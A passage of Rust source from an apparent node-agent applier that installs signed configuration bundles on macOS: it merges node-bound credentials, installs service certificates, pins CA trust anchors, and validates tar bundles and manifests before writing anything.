/// payload into the agent env: existing lines for those two keys are
/// replaced, everything else is kept byte-for-byte. Only those two keys are
/// taken from the payload — anything else in it is ignored, not installed.
fn merge_nats_creds(payload: &str, env_path: &Path, me: &str) -> Result<(), String> {
    let mut user = String::new();
    let mut pass = String::new();
    let mut node = String::new();
    for line in payload.lines() {
        let t = line.trim();
        if let Some(v) = t.strip_prefix("NODE=") { node = v.trim().to_string(); }
        if let Some(v) = t.strip_prefix("NATS_NODE_USER=") { user = v.trim().to_string(); }
        if let Some(v) = t.strip_prefix("NATS_NODE_PASSWORD=") { pass = v.trim().to_string(); }
    }
    // Bound to this node, like the Linux applier (second review, L4): a
    // credential built for another node must not land here.
    if node.is_empty() {
        return Err("nats-creds has no NODE= line — refusing an unbound payload".into());
    }
    if !me.is_empty() && node != me {
        return Err(format!("nats-creds names '{node}' but this node is '{me}' — refusing"));
    }
    if user.is_empty() || pass.is_empty() {
        return Err("nats-creds lacks NATS_NODE_USER / NATS_NODE_PASSWORD".into());
    }
    let existing = std::fs::read_to_string(env_path).map_err(|e| format!("read {}: {e}", env_path.display()))?;
    let mut out: Vec<String> = existing
        .lines()
        .filter(|l| !l.starts_with("NATS_NODE_USER=") && !l.starts_with("NATS_NODE_PASSWORD="))
        .map(str::to_string)
        .collect();
    out.push(format!("NATS_NODE_USER={}", super::env_quote::env_quote(&user)));
    out.push(format!("NATS_NODE_PASSWORD={}", super::env_quote::env_quote(&pass)));
    std::fs::write(env_path, out.join("\n") + "\n").map_err(|e| format!("write {}: {e}", env_path.display()))?;
    use std::os::unix::fs::PermissionsExt;
    let _ = std::fs::set_permissions(env_path, std::fs::Permissions::from_mode(0o600));
    Ok(())
}

fn merge_fleet_secrets(body: &str, env_path: &Path, me: &str) -> Result<(), String> {
    let mut carried: Vec<(String, String)> = Vec::new();
    let mut node = String::new();
    for line in body.lines() {
        let t = line.trim();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let Some((k, v)) = t.split_once('=') else {
            return Err(format!("fleet-secrets: '{t}' is not KEY=value — refusing"));
        };
        if k == "NODE" {
            node = v.trim().to_string();
            continue;
        }
        if !FLEET_SECRET_KEYS.contains(&k) {
            return Err(format!("fleet-secrets: '{k}' is not a fleet key — refusing"));
        }
        if v.is_empty() {
            return Err(format!("fleet-secrets: '{k}' has no value — refusing"));
        }
        carried.push((k.to_string(), v.to_string()));
    }
    if node.is_empty() {
        return Err("fleet-secrets: no NODE= line — refusing an unbound payload".into());
    }
    // Same anti-replay check the applier makes: a payload built for another
    // node must not land here just because it decrypted.
    if !me.is_empty() && node != me {
        return Err(format!("fleet-secrets names '{node}' but this node is '{me}' — refusing"));
    }
    if carried.is_empty() {
        return Err("fleet-secrets: names no fleet key — nothing to converge".into());
    }
    let existing = std::fs::read_to_string(env_path)
        .map_err(|e| format!("{}: {e} — provision this node before converging its credentials", env_path.display()))?;
    let mut out = String::with_capacity(existing.len());
    // Drop only the keys this payload carries: a payload naming one key
    // must not blank the other.
    for line in existing.lines() {
        let keep = match line.split_once('=') {
            Some((k, _)) => !carried.iter().any(|(ck, _)| ck == k),
            None => true,
        };
        if keep {
            out.push_str(line);
            out.push('\n');
        }
    }
    for (k, v) in &carried {
        out.push_str(&format!("{k}={}\n", super::env_quote::env_quote(v)));
    }
    if !out.lines().any(|l| l.starts_with("NODE_ID=") && l.len() > "NODE_ID=".len()) {
        return Err("fleet-secrets: merge lost NODE_ID — aborting".into());
    }
    let tmp = env_path.with_extension("next");
    std::fs::write(&tmp, &out).map_err(|e| e.to_string())?;
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600));
    }
    std::fs::rename(&tmp, env_path).map_err(|e| e.to_string())
}

/// Install the `svc-<x>.crt` / `svc-<x>.key` pairs a bundle carries into
/// `<pki>/services/<x>/service.{crt,key}` — the macOS half of noo-apply's
/// block for the same kinds. Cert 0644, key 0600, directory 0755, each file
/// written beside its target and renamed over it. Refuses a half pair. A
/// leaf the bundle does not carry is left alone (revocation is its own
/// verb). Runs as the user (the agent and Docker Desktop read these as that
/// user), from the verified payloads. Returns the services installed.
pub(crate) fn install_service_leaves(payloads: &Payloads, pki: &Path) -> Result<Vec<&'static str>, String> {
    use std::os::unix::fs::PermissionsExt;
    let mut done = Vec::new();
    for l in crate::commands::node_leaves::NODE_DOOR_LEAVES {
        let (c, k) = match (payloads.get(l.crt_kind), payloads.get(l.key_kind)) {
            (None, None) => continue,
            (Some(c), Some(k)) => (c, k),
            _ => return Err(format!("svc-{} carries half a leaf (cert and key travel together) — refusing", l.service)),
        };
        let dir = pki.join("services").join(l.service);
        std::fs::create_dir_all(&dir).map_err(|e| format!("mkdir {}: {e}", dir.display()))?;
        for d in [pki.join("services"), dir.clone()] {
            std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755))
                .map_err(|e| format!("chmod {}: {e}", d.display()))?;
        }
        for (bytes, name, mode) in [(k, "service.key", 0o600), (c, "service.crt", 0o644)] {
            user_write(&dir.join(name), bytes, mode).map_err(|e| format!("install {name}: {e}"))?;
        }
        done.push(l.service);
    }
    Ok(done)
}

/// The `host-telemetry` payload is bound to one node and carries nothing
/// else: exactly one non-blank line, `NODE=<name>`. A fixed operation, so no
/// command, path or value can ride in it. Mirrors `host_telemetry_payload_ok`
/// in noo-apply.sh (65 anything else, 76 another node).
pub(crate) fn host_telemetry_binding(body: &str, me: &str) -> Result<(), String> {
    let lines: Vec<&str> = body.lines().filter(|l| !l.trim().is_empty()).collect();
    let name = match lines.as_slice() {
        [one] => one.strip_prefix("NODE=").filter(|n| !n.is_empty()
            && n.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))),
        _ => None,
    };
    let Some(want) = name else {
        return Err("host-telemetry carries nothing but NODE=<name> - refusing a payload with anything else".into());
    };
    if want != me {
        return Err(format!("host-telemetry names '{want}' but this node is '{me}' - refusing"));
    }
    Ok(())
}

/// Mac half of the `host-telemetry` kind: the brew tailscaled's plist key
/// (unless the operator's opt-in marker exists), a launchctl restart only when
/// the key was added, and `brew analytics off` as the console user.
fn host_telemetry_darwin(user: &str, as_root: bool) -> Result<(), String> {
    use crate::vendor::{tailscale_brew_plist, tailscale_nologs_mac_steps, TAILSCALE_NO_LOGS_ENV, TAILSCALE_UPLOAD_MARKER};
    let plist = tailscale_brew_plist();
    // Absolute paths only (H2 third review): the steps name launchctl bare.
    let abs = |a: &str| if a == "launchctl" { LAUNCHCTL.to_string() } else { a.to_string() };
    let sudo = |argv: &[String]| -> Command {
        let mut c = Command::new(if as_root { abs(&argv[0]) } else { SUDO.to_string() });
        if as_root {
            c.args(&argv[1..]);
        } else {
            c.arg(abs(&argv[0])).args(&argv[1..]);
        }
        c
    };
    let marker = Path::new(TAILSCALE_UPLOAD_MARKER).exists();
    if marker {
        crate::ui::done(&format!("host-telemetry: skipped - operator opt-in ({TAILSCALE_UPLOAD_MARKER} exists)"));
    } else if !Path::new(plist).is_file() {
        crate::ui::done("host-telemetry: no brew tailscale service here (the Standalone and App Store apps cannot be switched)");
    } else {
        let (_, printed) = run(Command::new("/usr/libexec/PlistBuddy")
            .args(["-c", &format!("Print :EnvironmentVariables:{TAILSCALE_NO_LOGS_ENV}"), plist]));
        let steps = tailscale_nologs_mac_steps(plist, printed.trim() == "true", false);
        if steps.is_empty() {
            crate::ui::done("host-telemetry: tailscaled's log upload is already off (no change, not restarted)");
        }
        for (argv, may_fail) in &steps {
            let (rc, out) = run(&mut sudo(argv));
            if rc != 0 && !may_fail {
                return Err(format!("host-telemetry: `{}` failed: {out}", argv.join(" ")));
            }
        }
        if !steps.is_empty() {
            std::thread::sleep(std::time::Duration::from_secs(3));
            crate::ui::done("host-telemetry: tailscaled client log upload off (restarted)");
        }
    }
    // Homebrew refuses to run as root: ask it as the console user. Best effort.
    for brew in ["/opt/homebrew/bin/brew", "/usr/local/bin/brew"] {
        if Path::new(brew).is_file() {
            let mut c = if as_root { let mut c = Command::new(SUDO); c.args(["-u", user, ENV]); c } else { Command::new(ENV) };
            let _ = run(c.args(["HOMEBREW_NO_ANALYTICS=1", brew, "analytics", "off"]));
            break;
        }
    }
    Ok(())
}

/// The generation of this CLI as an applier. A bundle's
/// `cli-binary` must carry a generation at least this high: an older CLI has
/// the CA-signed lane open by default. `#[used]` keeps the marker in every
/// build, which is what the next CLI's floor check reads.
const APPLY_GENERATION: u32 = 1;
#[used]
static APPLY_GENERATION_MARKER: [u8; 24] = *b"noo-apply-generation=01;";

/// The highest `noo-apply-generation=NN;` marker in a CLI binary, 0 if none.
fn apply_generation_of(bin: &[u8]) -> u32 {
    const NEEDLE: &[u8] = b"noo-apply-generation=";
    let mut best = 0;
    let mut i = 0;
    while let Some(at) = bin[i..].windows(NEEDLE.len()).position(|w| w == NEEDLE) {
        let start = i + at + NEEDLE.len();
        let digits: Vec<u8> = bin[start..].iter().take(4).take_while(|c| c.is_ascii_digit()).copied().collect();
        if !digits.is_empty() && bin.get(start + digits.len()) == Some(&b';') {
            if let Ok(n) = std::str::from_utf8(&digits).unwrap_or("0").parse::<u32>() {
                best = best.max(n);
            }
        }
        i = start;
    }
    best
}

/// The kinds a manifest's payload lines name, in order.
fn manifest_kinds(manifest: &str) -> Vec<String> {
    manifest
        .lines()
        .filter(|l| !l.starts_with('#'))
        .filter_map(|l| l.split_whitespace().nth(1).map(str::to_string))
        .collect()
}

/// Text kinds: no CR, no NUL (see `noo-apply.sh` TEXT_KINDS).
const TEXT_KINDS: &[&str] = &[
    "agent-env", "harness-env", "nats-creds", "fleet-secrets", "host-telemetry", "teardown",
    "cli-user", "signing-pub", "ca.crt", "node.crt", "node.key", "agent-plist", "run-agent",
    "harness-plist", "run-harness", "restart-backends",
];

/// Where a ROOT apply keeps its trust anchors (`ca.crt`, `signing.pub`):
/// root:wheel, outside the user's ~/noomesh, which every apply chowns to
/// the user.
const ROOT_ANCHOR_DIR: &str = "/Library/Application Support/noomesh/pki";

/// The root anchor dir, created on first use from the user's copy (the
/// one-time migration for a Mac enrolled before the move; the same trust the
/// node already had, taken once, and never again from a user-owned file).
/// The user's copy arrives as bytes the caller read AS THE USER.
fn ensure_root_anchors(user: &UserAnchors, root: &Path) -> Result<PathBuf, String> {
    let _r = privs::root();
    ensure_root_anchors_with(user, root, privs::is_root_process())
}

fn ensure_root_anchors_with(user: &UserAnchors, root: &Path, check_owner: bool) -> Result<PathBuf, String> {
    use std::os::unix::fs::PermissionsExt;
    // Second review, L1: a pre-existing anchor dir (or its parent) that is a
    // symlink, not root's, or writable by others is refused — whoever owns
    // it would own the trust decision.
    if check_owner {
        if let Some(parent) = root.parent() {
            root_dir_trustworthy(parent)?;
        }
        root_dir_trustworthy(root)?;
    }
    if !root.join("ca.crt").is_file() {
        let Some(ca) = &user.ca else {
            return Err(format!("no CA trust anchor at {} or ~/noomesh/pki — re-run `noo enroll` (77)", root.display()));
        };
        // The enroll-time pin is REQUIRED (H2 third review, L5): the CA taken
        // from the user's copy must be the CA the enrollment blob pinned, and
        // a deleted pin must not turn the check off.
        let Some(pin) = user.pin.as_deref().filter(|p| !p.is_empty()) else {
            return Err("REFUSED — ~/noomesh/ca.sha256 (the CA pin recorded at enroll) is missing, so the CA in \
                        ~/noomesh/pki cannot be taken as this Mac's root trust anchor; re-run `noo enroll` (77)".into());
        };
        let have = cert_der_sha256(ca).unwrap_or_default();
        if !have.eq_ignore_ascii_case(pin) {
            return Err(format!(
                "REFUSED — ~/noomesh/pki/ca.crt (sha256 {have}) is not the CA this Mac enrolled with ({pin}); \
                 re-run `noo enroll` (77)"));
        }
        if let Some(parent) = root.parent() {
            std::fs::create_dir_all(parent).map_err(|e| format!("anchor dir {}: {e}", parent.display()))?;
            let _ = std::fs::set_permissions(parent, std::fs::Permissions::from_mode(0o755));
        }
        std::fs::create_dir_all(root).map_err(|e| format!("anchor dir {}: {e}", root.display()))?;
        let _ = std::fs::set_permissions(root, std::fs::Permissions::from_mode(0o755));
        if check_owner {
            // Created by root just now; re-checked before a byte lands in it.
            if let Some(parent) = root.parent() {
                root_dir_trustworthy(parent)?;
            }
            root_dir_trustworthy(root)?;
        }
        let chown = check_owner && unsafe { libc::geteuid() } == 0;
        if let Some(sp) = &user.signing {
            write_new_file(&root.join("signing.pub"), sp, 0o644, chown).map_err(|e| format!("anchor signing.pub: {e}"))?;
        }
        write_new_file(&root.join("ca.crt"), ca, 0o644, chown).map_err(|e| format!("anchor ca.crt: {e}"))?;
        crate::ui::note(&format!(
            "trust anchors moved to {} (root-owned); ~/noomesh/pki is no longer trusted for bundles",
            root.display()));
    }
    let _ = std::fs::set_permissions(root, std::fs::Permissions::from_mode(0o755));
    if check_owner && unsafe { libc::geteuid() } == 0 {
        // Inside a directory just shown to be root's alone: nothing here can
        // be a planted link, and lchown would not follow one anyway.
        for p in [root.to_path_buf(), root.join("ca.crt"), root.join("signing.pub")] {
            let _ = std::os::unix::fs::lchown(&p, Some(0), Some(0));
        }
    }
    for name in ["ca.crt", "signing.pub"] {
        let _ = std::fs::set_permissions(root.join(name), std::fs::Permissions::from_mode(0o644));
    }
    Ok(root.to_path_buf())
}

/// A fresh 0700 directory for root's stage: under ROOT_STATE_DIR (root's
/// own, checked with its parent) when this process is root, never the
/// shared temp dir (H2 third review, L7). An unprivileged run stages in its
/// own temp dir, where it can harm nobody but itself.
fn private_stage_dir(prefix: &str) -> Result<PathBuf, String> {
    let under = if privs::is_root_process() {
        ensure_root_state_dir(Path::new(ROOT_STATE_DIR))?;
        PathBuf::from(ROOT_STATE_DIR)
    } else {
        std::env::temp_dir()
    };
    private_stage_dir_in(&under, prefix)
}

/// A fresh 0700 directory in `under`, never one that already existed (a
/// predictable name is a race another user can win).
fn private_stage_dir_in(under: &Path, prefix: &str) -> Result<PathBuf, String> {
    use std::os::unix::fs::DirBuilderExt;
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let dir = under.join(format!("{prefix}-{}-{nanos:x}", std::process::id()));
    std::fs::DirBuilder::new()
        .mode(0o700)
        .create(&dir)
        .map_err(|e| format!("stage {}: {e}", dir.display()))?;
    Ok(dir)
}

/// Extract a bundle tar into `stage`, writing ONLY regular files named
/// `manifest`, `manifest.sig`, `manifest.xsig.N` or `files/<kind>` (and the
/// `files` directory). Any other member — symlink, hardlink, device, a long
/// name or pax header, a path outside that layout, a duplicate — refuses the
/// whole bundle before anything is written. Parity with `noo-apply.sh`
/// `bundle_tar_ok`.
fn extract_bundle(tar: &[u8], stage: &Path) -> Result<(), String> {
    let members = tar_members(tar)?;
    let mut seen = std::collections::HashSet::new();
    for (name, kind, _, _) in &members {
        let n = name.trim_end_matches('/');
        if !seen.insert(n.to_string()) {
            return Err(format!("REFUSED — the bundle carries '{n}' twice (65)"));
        }
        let ok = match *kind {
            b'0' | 0 => bundle_member_name_ok(n),
            b'5' => n == "files",
            _ => false,
        };
        if !ok {
            let what = if matches!(*kind, b'0' | 0 | b'5') { "not one a bundle may carry".to_string() }
                       else { format!("type '{}': not a regular file", *kind as char) };
            return Err(format!("REFUSED — bundle member '{n}' is {what} (65)"));
        }
    }
    std::fs::create_dir_all(stage.join("files")).map_err(|e| format!("stage: {e}"))?;
    for (name, kind, off, len) in members {
        if kind == b'5' {
            continue;
        }
        let dst = stage.join(name.trim_end_matches('/'));
        let mut f = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&dst)
            .map_err(|e| format!("stage {}: {e}", dst.display()))?;
        std::io::Write::write_all(&mut f, &tar[off..off + len]).map_err(|e| format!("stage: {e}"))?;
    }
    Ok(())
}

fn bundle_member_name_ok(n: &str) -> bool {
    if matches!(n, "manifest" | "manifest.sig") {
        return true;
    }
    if let Some(d) = n.strip_prefix("manifest.xsig.") {
        return !d.is_empty() && d.len() <= 2 && d.bytes().all(|c| c.is_ascii_digit());
    }
    if let Some(k) = n.strip_prefix("files/") {
        return !k.is_empty()
            && !k.starts_with('.')
            && k.bytes().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'.' || c == b'-');
    }
    false
}

/// `(name, typeflag, data offset, size)` for each member of a ustar/GNU tar.
fn tar_members(tar: &[u8]) -> Result<Vec<(String, u8, usize, usize)>, String> {
    let bad = |why: &str| Err(format!("REFUSED — the bundle is not a well-formed tar ({why}) (65)"));
    let mut out = Vec::new();
    let mut at = 0;
    while at + 512 <= tar.len() {
        let h = &tar[at..at + 512];
        if h.iter().all(|b| *b == 0) {
            return Ok(out);
        }
        let field = |a: usize, b: usize| -> &[u8] {
            let f = &h[a..b];
            &f[..f.iter().position(|c| *c == 0).unwrap_or(f.len())]
        };
        let Ok(name) = std::str::from_utf8(field(0, 100)) else { return bad("a name that is not UTF-8") };
        let prefix = if &h[257..262] == b"ustar" { std::str::from_utf8(field(345, 500)).unwrap_or("") } else { "" };
        if !prefix.is_empty() {
            return bad("a prefixed name");
        }
        let size_s = std::str::from_utf8(field(124, 136)).unwrap_or("").trim();
        let Ok(size) = usize::from_str_radix(if size_s.is_empty() { "0" } else { size_s }, 8) else {
            return bad("a size that does not parse");
        };
        let data = at + 512;
        if data + size > tar.len() {
            return bad("a member that runs past the end");
        }
        out.push((name.to_string(), h[156], data, size));
        at = data + size.div_ceil(512) * 512;
    }
    bad("no end-of-archive marker")
}

/// Where the root fetch daemon logs: a root-owned directory, not /tmp
/// (second review, L4 — a world-writable /tmp path is a symlink target).
pub(crate) const FETCH_LOG: &str = "/Library/Logs/noomesh-fetch.log";

/// One manifest shape for every reader (parity with `noo-apply.sh`
/// `manifest_ok`): header lines exactly as built, payload lines exactly
/// `<64 hex><two spaces><kind>`, anchored at column 1, nothing else.
fn manifest_shape_ok(m: &[u8]) -> Result<(), String> {
    let bad = || Err("REFUSED — the manifest has a line that is not a header or '<sha256>  <kind>' (65)".to_string());
    if m.contains(&b'\r') || m.contains(&0) {
        return bad();
    }
    let Ok(text) = std::str::from_utf8(m) else { return bad() };
    let name_ok = |v: &str, max: usize, extra: &[u8]| {
        !v.is_empty() && v.len() <= max && v.bytes().all(|c| c.is_ascii_alphanumeric() || extra.contains(&c))
    };
    for line in text.lines() {
        let ok = if line == "#noo-bundle 2" {
            true
        } else if let Some(n) = line.strip_prefix("#node ") {
            name_ok(n, 64, b"._-")
        } else if let Some(t) = line.strip_prefix("#issued ") {
            !t.is_empty() && t.len() <= 12 && t.bytes().all(|c| c.is_ascii_digit())
        } else if line.len() > 66 && &line[64..66] == "  " {
            let (sum, kind) = (&line[..64], &line[66..]);
            sum.bytes().all(|c| c.is_ascii_digit() || (b'a'..=b'f').contains(&c))
                && kind.len() <= 64
                && kind.bytes().next().is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
                && kind.bytes().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'.' || c == b'-')
        } else {
            false
        };
        if !ok {
            return bad();
        }
    }
    Ok(())
}

/// What the last verified bundle came in on, and which anchors it was judged
/// against, for the apply report: `verified-by: <lane> ca-lane: retired
/// anchors: ca sha256:<DER> signing sha256:<SPKI PEM>` — the same words the
/// Linux applier reports, plus the Mac's anchor fingerprints, which
/// `noo cluster verify` compares with the controller's.
static LAST_VERIFIED: std::sync::Mutex<Option<String>> = std::sync::Mutex::new(None);

fn record_verified(via: &str, ca: &Path, signing_pub: &Path) {
    let ca_fp = std::fs::read(ca).ok().and_then(|p| cert_der_sha256(&p).ok()).unwrap_or_else(|| "-".into());
    let sp_fp = std::fs::read(signing_pub)
        .map(|p| crate::commands::security_local::signing_pub_fingerprint(&p))
        .unwrap_or_else(|_| "-".into());
    if let Ok(mut g) = LAST_VERIFIED.lock() {
        *g = Some(format!("verified-by: {via} ca-lane: retired anchors: ca sha256:{ca_fp} signing sha256:{sp_fp}"));
    }
}

fn last_verified() -> String {
    LAST_VERIFIED.lock().ok().and_then(|g| g.clone()).unwrap_or_default()
}

/// Root binaries this apply was refused (H2 third review, verification
/// item 1): `root_install` will not write into a directory that is not
/// root's alone (a Homebrew-owned /usr/local/bin), and the rest of the apply
/// still lands — so the refusal must reach the controller in the report, or
/// "applied, rc 0" hides a node still running its old CLI or helper.
static ROOT_REFUSED: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

fn note_root_refused(what: &str) {
    if let Ok(mut g) = ROOT_REFUSED.lock() {
        if !g.iter().any(|w| w == what) {
            g.push(what.to_string());
        }
    }
}

fn root_refused() -> Vec<String> {
    ROOT_REFUSED.lock().map(|g| g.clone()).unwrap_or_default()
}

/// What a teardown's `tailscale logout` did, for the report.
static TEARDOWN_DETAIL: std::sync::Mutex<Option<String>> = std::sync::Mutex::new(None);

/// The tag `cluster verify` reads out of an apply report (`with_node_root_refusals`).
pub(crate) const ROOT_REFUSED_TAG: &str = "root-refused:";

/// The binary kinds this apply handled, as the Linux applier prints them in
/// its `applied:` summary: `<kind>` when the bytes were installed, and
/// `<kind>=unchanged` when the node already ran exactly those bytes and the
/// write was skipped. A different token on purpose: the controller's
/// whole-token lookup (`applier_applied`) for `<kind>` means "installed".
static BINARY_OUTCOMES: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

/// `<kind>=<sha256>` for each binary this apply left running, installed or
/// unchanged: the node's own statement of what it runs (the Linux applier's
/// `binary-sha:` line), which lets the controller leave an identical binary
/// out of the next bundle. Absent from an older CLI, which means "carry all".
static BINARY_SHAS: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

fn note_binary(kind: &str, unchanged: bool, bytes: &[u8]) {
    use sha2::{Digest, Sha256};
    if let Ok(mut g) = BINARY_OUTCOMES.lock() {
        g.retain(|t| t.split('=').next() != Some(kind));
        g.push(if unchanged { format!("{kind}=unchanged") } else { kind.to_string() });
    }
    if let Ok(mut g) = BINARY_SHAS.lock() {
        g.retain(|t| t.split('=').next() != Some(kind));
        g.push(format!("{kind}={}", hex::encode(Sha256::digest(bytes))));
    }
}

fn binary_shas() -> Vec<String> {
    BINARY_SHAS.lock().map(|g| g.clone()).unwrap_or_default()
}

fn binary_outcomes() -> Vec<String> {
    BINARY_OUTCOMES.lock().map(|g| g.clone()).unwrap_or_default()
}

/// Append the binary summary to an apply report message as
/// ` applied: <tokens> binary-sha: <kind>=<sha256> …` (nothing when this
/// bundle carried no binary, so such a message is unchanged).
fn with_binary_summary(msg: String, tokens: &[String], shas: &[String]) -> String {
    if tokens.is_empty() {
        return msg;
    }
    let mut m = format!("{msg} applied: {}", tokens.join(" "));
    if !shas.is_empty() {
        m.push_str(&format!(" binary-sha: {}", shas.join(" ")));
    }
    m
}

/// Is `path` already exactly these bytes with exactly this mode? True only on
/// positive proof: an absent, unreadable or empty file, an empty payload, or a
/// different mode all say "not the same", so the caller installs. Compares the
/// bytes themselves, not a version string.
fn installed_matches(path: &Path, want: &[u8], mode: u32) -> bool {
    use std::os::unix::fs::PermissionsExt;
    if want.is_empty() {
        return false;
    }
    let Ok(meta) = std::fs::metadata(path) else { return false };
    if !meta.is_file() || meta.permissions().mode() & 0o777 != mode {
        return false;
    }
    std::fs::read(path).is_ok_and(|have| have == want)
}

/// A digest of everything the agent LaunchDaemon loads at start: its TLS
/// material, env, runner, binary, the backend door leaves, the secret files
/// and the daemon plist. Equal before and after an apply means a restart would
/// load nothing new. An unreadable file digests as absent, which can only make
/// two digests differ less often than the truth; the caller also requires the
/// daemon to be loaded, so a wrongly equal digest never leaves it dead.
fn agent_inputs_fingerprint(base: &Path, plist: &Path) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    let mut feed = |label: &str, p: &Path| {
        h.update(label.as_bytes());
        h.update([0]);
        match std::fs::read(p) {
            Ok(b) => { h.update([1]); h.update(Sha256::digest(&b)); }
            Err(_) => h.update([0]),
        }
    };
    for rel in ["pki/ca.crt", "pki/node.crt", "pki/node.key", "agent.env", "run-agent.sh", "bin/noo-node-agent"] {
        feed(rel, &base.join(rel));
    }
    // The directories whose members vary: service leaves and secret files.
    for dir in ["pki", "secrets"] {
        let mut names: Vec<String> = std::fs::read_dir(base.join(dir)).into_iter().flatten().flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| dir == "secrets" || n.starts_with("svc-"))
            .collect();
        names.sort();
        for n in names {
            feed(&format!("{dir}/{n}"), &base.join(dir).join(&n));
        }
    }
    feed("plist", plist);
    hex::encode(h.finalize())
}

/// The apply report message: `applied <verified-by …>` and, when root
/// binaries were refused, ` root-refused: noo-cli,noo-hostd`. Pure, so the
/// shape `cluster verify` parses is pinned.
fn apply_report_msg(verified: &str, refused: &[String]) -> String {
    let mut m = format!("applied {verified}").trim_end().to_string();
    if !refused.is_empty() {
        m.push_str(&format!(" {ROOT_REFUSED_TAG} {}", refused.join(",")));
    }
    m
}

/// The exit code an applier refusal names at its end (`… (77)`), so the Mac
/// reports the same code the Linux applier exits with; 1 when none.
fn trailing_code(e: &str) -> i64 {
    e.trim_end()
        .strip_suffix(')')
        .and_then(|r| r.rsplit_once('('))
        .and_then(|(_, n)| n.parse::<i64>().ok())
        .filter(|n| (64..=78).contains(n))
        .unwrap_or(1)
}

/// Is `p` safe for root to write into: absent, or a real directory (not a
/// symlink) owned by root and not group/other-writable.
fn root_dir_trustworthy(p: &Path) -> Result<(), String> {
    dir_trustworthy_for(p, 0)
}

/// `root_dir_trustworthy` with the owner as a parameter, so a test that is
/// not root can stand its own uid in for root's.
fn dir_trustworthy_for(p: &Path, owner: u32) -> Result<(), String> {
    use std::os::unix::fs::MetadataExt;
    match std::fs::symlink_metadata(p) {
        Err(_) => Ok(()),
        Ok(m) if m.file_type().is_symlink() || !m.is_dir() => {
            Err(format!("REFUSED — {} is not a plain directory; root does not write there (77)", p.display()))
        }
        Ok(m) if m.uid() != owner || m.mode() & 0o022 != 0 => Err(format!(
            "REFUSED — {} is not root-owned or is writable by others (uid {}, mode {:o}); root does not write there (77)",
            p.display(), m.uid(), m.mode() & 0o7777)),
        Ok(_) => Ok(()),
    }
}

/// May root EXECUTE `p`: a regular file (not a symlink), root-owned, not
/// group/other-writable, in a directory — and that directory's parent —
/// that pass `root_dir_trustworthy`. `/opt/homebrew/bin` (the user's) and a
/// Homebrew-owned `/usr/local/bin` fail it.
fn root_exec_trustworthy(p: &Path) -> Result<(), String> {
    use std::os::unix::fs::MetadataExt;
    let parent = p.parent().ok_or_else(|| format!("{}: no directory", p.display()))?;
    if !parent.exists() {
        return Err(format!("{} does not exist", parent.display()));
    }
    if let Some(gp) = parent.parent().filter(|g| !g.as_os_str().is_empty()) {
        root_dir_trustworthy(gp)?;
    }
    root_dir_trustworthy(parent)?;
    let m = std::fs::symlink_metadata(p).map_err(|e| format!("{}: {e}", p.display()))?;
    if !m.file_type().is_file() || m.uid() != 0 || m.mode() & 0o022 != 0 {
        return Err(format!(
            "REFUSED — {} is not a root-owned regular file nobody else can write; root does not run it (77)",
            p.display()
        ));
    }
    Ok(())
}

/// The keys `agent-env` is rendered with — `node-agent-go/deploy/
/// noo-node-agent.env.tmpl`, and the same list as `noo-apply.sh`'s
/// `AGENT_ENV_KEYS` (tests/test_apply_env_unit_shape.py pins all three).
const AGENT_ENV_KEYS: &[&str] = &[
    "NODE_ID", "NODE_IP", "NODE_TIER", "GPU_MODEL", "CONTROLLER_URL", "NATS_URL",
    "NOO_NODE_AGENT_TOKEN", "NOO_CLUSTER_SECRET", "NOO_PKI_DIR", "NOO_TLS_CA", "NOO_TLS_CERT",
    "NOO_TLS_KEY", "NOO_MTLS_NODES", "OLLAMA_URL", "NOO_SELF_NODE", "NOO_DATA_ROOT",
    "HF_CACHE_DIR", "MODELS_DIR", "OLLAMA_DATA_DIR", "NOO_MODEL_CACHE_URL", "PATH",
    "NOO_FORCE_GPU", "NOO_OLLAMA_GPU_COUNT", "NOO_IMAGE_PREFIX", "NOO_IMAGE_TAG",
    "NODE_AGENT_PORT", "LOG_LEVEL", "DOCKER_HOST",
];
/// Keys an older controller still renders: accepted, never acted on.
const AGENT_ENV_INERT_KEYS: &[&str] = &["NOO_APPLY_ACCEPT_CA_SIGNED"];
/// The keys `harness-env` is rendered with (`noo-harness.env.tmpl`).
const HARNESS_ENV_KEYS: &[&str] = &[
    "NODE_ID", "NOO_GATEWAY_URL", "NATS_URL", "NATS_NODE_USER", "NATS_NODE_PASSWORD",
    "NOO_TLS_CA", "NOO_TLS_CERT", "NOO_TLS_KEY", "NOO_HARNESS_MODEL_URL",
    "NOO_NODE_AGENT_TOKEN", "NOO_CLUSTER_SECRET", "NOO_HARNESS_MODEL", "NOO_HARNESS_BACKEND",
    "NOO_HARNESS_MAX_TURNS", "RUST_LOG",
];
const AGENT_ENV_PATH: &str = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/wsl/lib";
const AGENT_ENV_DOCKER_HOST: &str = "unix:///var/run/docker.sock";

/// `agent-env` / `harness-env` among the verified payloads, judged before
/// install.
fn env_payloads_ok(payloads: &Payloads) -> Result<(), String> {
    for (kind, keys, inert) in [
        ("agent-env", AGENT_ENV_KEYS, AGENT_ENV_INERT_KEYS),
        ("harness-env", HARNESS_ENV_KEYS, &[][..]),
    ] {
        if let Some(body) = payloads.get(kind) {
            env_payload_ok(&String::from_utf8_lossy(body), kind, keys, inert)?;
        }
    }
    Ok(())
}

/// An earlier release for the Mac: every line a comment, blank, or `KEY=value`
/// with a rendered KEY; PATH / DOCKER_HOST exactly the rendered values; and,
/// because the Mac runners `source` these files, a value that is nothing but
/// data to a shell — plain characters, `$HOME` as a prefix, or quoting as
